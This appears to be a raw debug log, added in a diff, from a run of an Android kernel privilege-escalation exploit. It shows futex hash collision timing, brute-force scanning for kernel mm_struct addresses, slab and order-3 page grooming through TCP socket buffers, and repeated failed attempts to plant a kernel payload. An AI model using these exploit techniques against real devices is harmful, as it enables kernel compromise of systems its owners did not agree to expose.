+[b24e39de8 23:26:24] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:26:24] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:26:24] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:26:24] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:26:24] [33m[*][t13553] [0mpayload nonce want=2197b15e30869446 got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:26:24] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c8821070 len=8 fill=0 pos=7883678008957363548 page=92978c32990bab14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:26:24] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c8821070 len=8 fill=0 pos=7883678008957363548 page=92978c32990bab14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:26:24] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c8821070 len=8 fill=0 pos=7883678008957363548 page=92978c32990bab14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:26:24] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c8821100 len=8 fill=0 pos=7883678008957363548 page=92978c32990baba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:26:24] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c8821100 len=8 fill=0 pos=7883678008957363548 page=92978c32990baba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:26:24] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93c8821100 len=8 fill=0 pos=7883678008957363548 page=92978c32990baba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:26:24] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:26:24] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:26:24] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:26:24] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:26:24] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff93c8820000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:26:24] [31m[-][t13553] [0mprepare_kernel_page retry 10/72
+[b24e39de8 23:26:24] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:26:26] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:26:26] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:26:26] [33m[*][t15635] [0mapprox_time=7 thr=70
+[b24e39de8 23:26:27] [33m[*][t15635] [0mstart finding collisisons
+[b24e39de8 23:26:27] [33m[*][t15635] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:26:27] [33m[*][t15635] [0mtarget_time=129 thr=70
+[b24e39de8 23:26:28] [33m[*][t15635] [0m  0000006987aed308 i=1633 t=17624/17585/17114
+[b24e39de8 23:26:29] [33m[*][t15635] [0m  0000006987dfdb88 i=2417 t=17625/17501/16409
+[b24e39de8 23:26:31] [33m[*][t15635] [0m  0000006988e57e58 i=6603 t=17693/17501/17572
+[b24e39de8 23:26:32] [33m[*][t15635] [0m  000000698932f518 i=7843 t=17652/15808/17662
+[b24e39de8 23:26:33] [33m[*][t15635] [0m  0000006989730520 i=8868 t=14942/17647/17470
+[b24e39de8 23:26:33] [33m[*][t15635] [0mfound 5 collisisons
+[b24e39de8 23:26:34] [33m[*][t15635] [0mpost-pile baseline=9 target=11 count=5
+[b24e39de8 23:26:34] [33m[*][t15635] [0mpost-pile[1] 0000006987aed308 t=11
+[b24e39de8 23:26:34] [33m[*][t15635] [0mpost-pile[2] 0000006987dfdb88 t=10
+[b24e39de8 23:26:34] [33m[*][t15635] [0mpost-pile[3] 0000006988e57e58 t=11
+[b24e39de8 23:26:34] [33m[*][t15635] [0mpost-pile[4] 000000698932f518 t=11
+[b24e39de8 23:26:34] [33m[*][t15635] [0mpost-pile[5] 0000006989730520 t=11
+[b24e39de8 23:26:34] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:26:34] [33m[*][t19785] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:26:34] [33m[*][t19787] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:26:34] [33m[*][t19788] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:26:34] [33m[*][t19790] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:26:34] [33m[*][t19792] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:26:34] [33m[*][t19789] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:26:34] [33m[*][t19791] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:26:34] [33m[*][t19786] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:26:34] [33m[*][t19790] [0mfound mm_struct ffffff93cb0bbfc0
+[b24e39de8 23:26:34] [33m[*][t19790] [0m[  5] scan done coarse=ffffff9400000000 end=ffffff9480000000 found=1
+[b24e39de8 23:26:34] [33m[*][t19785] [0m[  0] scan done coarse=ffffff9200000000 end=ffffff9240000000 found=1
+[b24e39de8 23:26:34] [33m[*][t19791] [0m[  6] scan done coarse=ffffff9480000000 end=ffffff9500000000 found=1
+[b24e39de8 23:26:34] [33m[*][t19787] [0m[  2] scan done coarse=ffffff92c0000000 end=ffffff9340000000 found=1
+[b24e39de8 23:26:34] [33m[*][t19786] [0m[  1] scan done coarse=ffffff9240000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:26:34] [33m[*][t19792] [0m[  7] scan done coarse=ffffff9500000000 end=ffffff9540000000 found=1
+[b24e39de8 23:26:34] [33m[*][t19789] [0m[  4] scan done coarse=ffffff93c0000000 end=ffffff9400000000 found=1
+[b24e39de8 23:26:34] [33m[*][t19788] [0m[  3] scan done coarse=ffffff9340000000 end=ffffff9380000000 found=1
+[b24e39de8 23:26:34] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff93cb0b8000 phys_probe=0xffffff91e2bd1d38 delta=8192418504 (7.6GB)
+[b24e39de8 23:26:34] [33m[*][t13553] [0mprepare_skb_payload base=ffffff93cb0b8000 delta=0 payload_base=ffffff93cb0b8000
+[b24e39de8 23:26:34] [33m[*][t13553] [0mskbdelta wrote pb=ffffff93cb0b8000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:26:34] [33m[*][t13553] [0mpayload nonce 177caa6730869470 at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:26:34] [33m[*][t13553] [0mdone
+[b24e39de8 23:26:34] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:26:34] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:26:34] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:34] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:34] [33m[*][t13553] [0mfix40 free-arm n=8 est_pfn=2666680 k=[-2,5]
+[b24e39de8 23:26:34] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:26:34] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:26:35] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:26:35] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:26:35] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:26:35] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:26:35] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:26:35] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:26:35] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:26:35] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:35] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:26:35] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:26:35] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:35] [33m[*][t13553] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2666680 k=[-2,5] k_fixed=-1
+[b24e39de8 23:26:35] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:26:35] [33m[*][t13553] [0mfix36 phase1 tp ctrl=528 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:26:35] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:26:36] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:26:36] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:26:36] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:26:36] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:26:36] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:26:37] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:26:37] [33m[*][t13553] [0mfix40 free HIT pfn=2928824 k=1 hits=1
+[b24e39de8 23:26:37] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:26:37] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:26:37] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff93cb0b9100 errno=22
+[b24e39de8 23:26:37] [31m[-][t13553] [0mwatchpoint open open addr=ffffff93cb0b9070 errno=22
+[b24e39de8 23:26:37] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff93cb0bff00 errno=22
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:26:37] [33m[*][t19798] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2666680 k=[-2,5] k_fixed=-1
+[b24e39de8 23:26:37] [33m[*][t19798] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:26:37] [33m[*][t19798] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:26:37] [33m[*][t19798] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:26:37] [33m[*][t19798] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:26:37] [33m[*][t19798] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:26:37] [33m[*][t19798] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:26:37] [33m[*][t19798] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:26:37] [33m[*][t19798] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:26:37] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=897
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:26:37] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:26:37] [33m[*][t13553] [0mfix36 phase2 tp ctrl=903 ord3=897 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff93cb0ba238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:26:37] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 38[b24e39de8 23:26:37] [33m[*][t13553] [0m 2f[b24e39de8 23:26:37] [33m[*][t13553] [0m de[b24e39de8 23:26:37] [33m[*][t13553] [0m 6a[b24e39de8 23:26:37] [33m[*][t13553] [0m d3[b24e39de8 23:26:37] [33m[*][t13553] [0m ff[b24e39de8 23:26:37] [33m[*][t13553] [0m ff[b24e39de8 23:26:37] [33m[*][t13553] [0m ff[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m 00[b24e39de8 23:26:37] [33m[*][t13553] [0m
+[b24e39de8 23:26:37] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:26:37] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:26:37] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:26:37] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:26:37] [33m[*][t13553] [0mpayload nonce want=177caa6730869470 got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:26:37] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cb0b9070 len=8 fill=0 pos=7883678008957363548 page=92978c329b952b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:26:37] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cb0b9070 len=8 fill=0 pos=7883678008957363548 page=92978c329b952b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:26:37] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cb0b9070 len=8 fill=0 pos=7883678008957363548 page=92978c329b952b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:26:37] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cb0b9100 len=8 fill=0 pos=7883678008957363548 page=92978c329b952ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:26:37] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cb0b9100 len=8 fill=0 pos=7883678008957363548 page=92978c329b952ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:26:37] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cb0b9100 len=8 fill=0 pos=7883678008957363548 page=92978c329b952ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:26:37] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:26:37] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:26:37] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:26:37] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:26:37] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff93cb0b8000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:26:37] [31m[-][t13553] [0mprepare_kernel_page retry 11/72
+[b24e39de8 23:26:37] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:26:40] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:26:40] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:26:40] [33m[*][t21135] [0mapprox_time=7 thr=70
+[b24e39de8 23:26:41] [33m[*][t21135] [0mstart finding collisisons
+[b24e39de8 23:26:41] [33m[*][t21135] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:26:41] [33m[*][t21135] [0mtarget_time=137 thr=70
+[b24e39de8 23:26:41] [33m[*][t21135] [0m  000000698766ff18 i=483 t=17814/16188/17749
+[b24e39de8 23:26:42] [33m[*][t21135] [0m  0000006987a9a070 i=1550 t=17806/17736/17732
+[b24e39de8 23:26:44] [33m[*][t21135] [0m  0000006988879f68 i=5101 t=17825/17698/17764
+[b24e39de8 23:26:46] [33m[*][t21135] [0m  0000006989815c48 i=9097 t=17789/14473/17764
+[b24e39de8 23:26:47] [33m[*][t21135] [0m  0000006989bb2930 i=10022 t=14532/17762/17744
+[b24e39de8 23:26:47] [33m[*][t21135] [0mfound 5 collisisons
+[b24e39de8 23:26:48] [33m[*][t21135] [0mpost-pile baseline=7 target=8 count=5
+[b24e39de8 23:26:48] [33m[*][t21135] [0mpost-pile[1] 000000698766ff18 t=8
+[b24e39de8 23:26:48] [33m[*][t21135] [0mpost-pile[2] 0000006987a9a070 t=8
+[b24e39de8 23:26:48] [33m[*][t21135] [0mpost-pile[3] 0000006988879f68 t=8
+[b24e39de8 23:26:48] [33m[*][t21135] [0mpost-pile[4] 0000006989815c48 t=8
+[b24e39de8 23:26:48] [33m[*][t21135] [0mpost-pile[5] 0000006989bb2930 t=8
+[b24e39de8 23:26:48] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:26:48] [33m[*][t25283] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:26:48] [33m[*][t25285] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:26:48] [33m[*][t25282] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:26:48] [33m[*][t25284] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:26:48] [33m[*][t25288] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:26:48] [33m[*][t25287] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:26:48] [33m[*][t25286] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:26:48] [33m[*][t25289] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:26:48] [33m[*][t25287] [0mfound mm_struct ffffff93cc33f800
+[b24e39de8 23:26:48] [33m[*][t25287] [0m[  5] scan done coarse=ffffff9400000000 end=ffffff9480000000 found=1
+[b24e39de8 23:26:48] [33m[*][t25283] [0m[  1] scan done coarse=ffffff9240000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:26:48] [33m[*][t25284] [0m[  2] scan done coarse=ffffff92c0000000 end=ffffff9340000000 found=1
+[b24e39de8 23:26:48] [33m[*][t25285] [0m[  3] scan done coarse=ffffff9340000000 end=ffffff9380000000 found=1
+[b24e39de8 23:26:48] [33m[*][t25286] [0m[  4] scan done coarse=ffffff93c0000000 end=ffffff9400000000 found=1
+[b24e39de8 23:26:48] [33m[*][t25282] [0m[  0] scan done coarse=ffffff9200000000 end=ffffff9240000000 found=1
+[b24e39de8 23:26:48] [33m[*][t25288] [0m[  6] scan done coarse=ffffff9480000000 end=ffffff9500000000 found=1
+[b24e39de8 23:26:48] [33m[*][t25289] [0m[  7] scan done coarse=ffffff9500000000 end=ffffff9540000000 found=1
+[b24e39de8 23:26:48] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff93cc338000 phys_probe=0xffffff91e2bd1d38 delta=8211817160 (7.6GB)
+[b24e39de8 23:26:48] [33m[*][t13553] [0mprepare_skb_payload base=ffffff93cc338000 delta=0 payload_base=ffffff93cc338000
+[b24e39de8 23:26:48] [33m[*][t13553] [0mskbdelta wrote pb=ffffff93cc338000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:26:48] [33m[*][t13553] [0mpayload nonce 1894c0a330869462 at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:26:48] [33m[*][t13553] [0mdone
+[b24e39de8 23:26:48] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:26:48] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:26:48] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:48] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:48] [33m[*][t13553] [0mfix40 free-arm n=8 est_pfn=2671416 k=[-2,5]
+[b24e39de8 23:26:48] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:26:48] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:26:49] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:26:49] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:26:49] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:26:49] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:26:49] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:26:50] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:26:50] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:26:50] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:50] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:26:50] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:26:50] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:26:50] [33m[*][t13553] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2671416 k=[-2,5] k_fixed=-1
+[b24e39de8 23:26:50] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:26:50] [33m[*][t13553] [0mfix36 phase1 tp ctrl=531 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:26:50] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:26:50] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:26:50] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:26:50] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:26:51] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:26:51] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:26:51] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:26:51] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:26:51] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:26:51] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:26:51] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:26:51] [33m[*][t13553] [0mfix40 free HIT pfn=2933560 k=1 hits=1
+[b24e39de8 23:26:51] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:26:51] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:26:51] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff93cc339100 errno=22
+[b24e39de8 23:26:51] [31m[-][t13553] [0mwatchpoint open open addr=ffffff93cc339070 errno=22
+[b24e39de8 23:26:51] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff93cc33ff00 errno=22
+[b24e39de8 23:26:51] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:26:51] [33m[*][t25299] [0mfix36 tp arm n=8 ctrl=1 est_pfn=2671416 k=[-2,5] k_fixed=-1
+[b24e39de8 23:26:51] [33m[*][t25299] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:26:51] [33m[*][t25299] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:26:51] [33m[*][t25299] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:26:51] [33m[*][t25299] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:26:51] [33m[*][t25299] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:26:52] [33m[*][t25299] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:26:52] [33m[*][t25299] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:26:52] [33m[*][t25299] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:26:52] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=897
+[b24e39de8 23:26:52] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:26:52] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:26:52] [33m[*][t13553] [0mfix36 phase2 tp ctrl=906 ord3=897 best=0 best_pfn=0 best3=0 best3_pfn=0 n=8
+[b24e39de8 23:26:52] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff93cc33a238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:26:52] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:26:52] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 38[b24e39de8 23:26:52] [33m[*][t13553] [0m 2f[b24e39de8 23:26:52] [33m[*][t13553] [0m de[b24e39de8 23:26:52] [33m[*][t13553] [0m 6a[b24e39de8 23:26:52] [33m[*][t13553] [0m d3[b24e39de8 23:26:52] [33m[*][t13553] [0m ff[b24e39de8 23:26:52] [33m[*][t13553] [0m ff[b24e39de8 23:26:52] [33m[*][t13553] [0m ff[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 00[b24e39de8 23:26:52] [33m[*][t13553] [0m 